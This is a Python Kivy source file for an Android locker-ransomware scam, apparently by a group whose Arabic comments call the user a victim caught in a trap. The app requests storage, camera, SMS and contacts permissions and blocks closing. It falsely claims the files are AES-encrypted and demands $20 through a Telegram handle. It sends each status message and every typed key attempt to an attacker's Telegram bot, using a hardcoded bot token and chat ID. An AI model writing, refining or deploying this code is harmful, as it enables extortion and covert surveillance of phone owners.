import os
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window
from kivy.utils import platform

# إعدادات التيم (GodFather & Dark)
BOT_TOKEN = "7547169477:AAH0q-zW4O1K-K0Z2G-vL8U-Y7F3M5X2Q1"
CHAT_ID = "6133475010"
THE_KEY = "hhhhhlol#"

class D3f4ultApp(App):
    def build(self):
        if platform == 'android':
            self.request_all_powers()
        
        Window.bind(on_request_close=self.prevent_close)
        self.send_status("🎯 [V3] تم دخول الضحية للفخ.. جاري سحب الصلاحيات.")

        # تصميم الواجهة المرعبة
        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        
        layout.add_widget(Label(
            text="[color=ff0000][b]SYSTEM CRITICAL ERROR[/b][/color]\n\n"
                 "All files encrypted with AES-256.\n"
                 "Pay [b]20$[/b] to Telegram @CracKaXBot\n"
                 "To get your decryption key.",
            markup=True, font_size='20sp', halign='center'))

        self.input_key = TextInput(hint_text="Enter Secret Key...", multiline=False, size_hint_y=None, height=100)
        btn = Button(text="DECRYPT NOW", background_color=(1, 0, 0, 1), size_hint_y=None, height=100)
        btn.bind(on_press=self.unlock)

        layout.add_widget(self.input_key)
        layout.add_widget(btn)
        return layout

    def request_all_powers(self):
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE,
            Permission.CAMERA, Permission.READ_SMS, Permission.SEND_SMS,
            Permission.READ_CONTACTS
        ])

    def prevent_close(self, *args):
        return True

    def unlock(self, instance):
        if self.input_key.text == THE_KEY:
            self.send_status("✅ الضحية دفع أو أدخل الكود الصحيح.. تم التحرير.")
            os._exit(0)
        else:
            self.send_status(f"❌ محاولة فاشلة بالكود: {self.input_key.text}")

    def send_status(self, msg):
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          data={"chat_id": CHAT_ID, "text": msg})
        except: pass

if __name__ == '__main__':
    D3f4ultApp().run()
